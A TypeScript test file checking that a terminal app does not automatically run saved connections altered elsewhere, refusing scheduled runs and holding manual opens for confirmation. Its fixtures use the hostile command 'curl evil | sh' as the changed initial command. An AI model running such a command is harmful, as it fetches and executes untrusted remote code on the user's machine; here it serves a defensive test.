/**
 * A saved connection changed elsewhere (a restore, an import, a synced file) since
 * it was confirmed here runs nothing by itself (#6065): a schedule does not connect
 * it, and opening it by hand shows what would run first.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

vi.mock("@/services/api", () => ({
  createTerminal: vi.fn(() => Promise.resolve("session-1")),
  storeCredential: vi.fn(() => Promise.resolve()),
  resolveCredential: vi.fn(() => Promise.resolve(null)),
  isSshKeyEncrypted: vi.fn(() => Promise.resolve(false)),
  saveSettings: vi.fn(() => Promise.resolve()),
}));
vi.mock("@/utils/frontendLog", () => ({ frontendLog: vi.fn(), frontendError: vi.fn() }));

import { createTerminal } from "@/services/api";
import { useAppStore } from "@/store/appStore";
import { setupSettingsRegion, seedSettings } from "@/test/settingsRegionTestHarness";
import { setupConnectionsRegion, seedConnectionsRegion } from "@/test/connectionsHarness";
import type { SavedConnection } from "@/types/connection";
import {
  ensureSavedConnectionBaseline,
  isSavedConnectionConfirmed,
  resetSavedConnectionTrustForTest,
} from "@/services/savedConnectionTrust";
import { connectSavedConnection } from "./connectSavedConnection";

setupSettingsRegion();
setupConnectionsRegion();

let addTab: ReturnType<typeof vi.fn>;

const shell = (initialCommand?: string): SavedConnection => ({
  id: "Build",
  name: "Build",
  folderId: null,
  config: {
    type: "local",
    config: { shell: "bash", ...(initialCommand ? { initialCommand } : {}) },
  },
});
const ssh = (host: string): SavedConnection => ({
  id: "Prod",
  name: "Prod",
  folderId: null,
  config: { type: "ssh", config: { host, username: "ana", authMethod: "agent" } },
});

beforeEach(async () => {
  vi.clearAllMocks();
  resetSavedConnectionTrustForTest();
  seedSettings({ workspaceImportAllowlist: [] });
  addTab = vi.fn(() => "tab-new");
  useAppStore.setState({
    ...useAppStore.getInitialState(),
    addTab: addTab as unknown as ReturnType<typeof useAppStore.getState>["addTab"],
    credentialStoreStatus: { mode: "none", status: "unlocked" },
  });
  // What this machine had: the build shell running make, prod at prod.example.
  seedConnectionsRegion({ connections: [shell("make"), ssh("prod.example")] });
  await ensureSavedConnectionBaseline();
});

describe("connectSavedConnection — a connection changed elsewhere (#6065)", () => {
  it("is not connected by a schedule", async () => {
    const result = await connectSavedConnection(shell("curl evil | sh"), { unattended: true });
    expect(result).toEqual({ status: "refused", reason: expect.stringContaining("not confirmed") });
    expect(addTab).not.toHaveBeenCalled();
    expect(vi.mocked(createTerminal)).not.toHaveBeenCalled();
  });

  it("opened by hand, shows what would run instead of running it", async () => {
    const result = await connectSavedConnection(shell("curl evil | sh"));
    expect(result).toEqual({ status: "opened", tabId: "tab-new", sessionId: null });
    expect(addTab).toHaveBeenCalledWith(
      "Build",
      "local",
      shell("curl evil | sh").config,
      expect.objectContaining({ heldUntilConfirmed: true })
    );
    expect(await isSavedConnectionConfirmed(shell("curl evil | sh"))).toBe(false);
  });

  it("opened by hand when nothing runs by itself, it is the confirmation", async () => {
    const result = await connectSavedConnection(ssh("new.example"));
    expect(result.status).toBe("opened");
    expect(addTab).toHaveBeenCalledWith(
      "Prod",
      "ssh",
      expect.anything(),
      expect.not.objectContaining({ heldUntilConfirmed: true })
    );
    expect(await isSavedConnectionConfirmed(ssh("new.example"))).toBe(true);
  });

  it("an unchanged one connects as before, also unattended", async () => {
    const result = await connectSavedConnection(shell("make"), { unattended: true });
    expect(result.status).not.toBe("refused");
  });
});
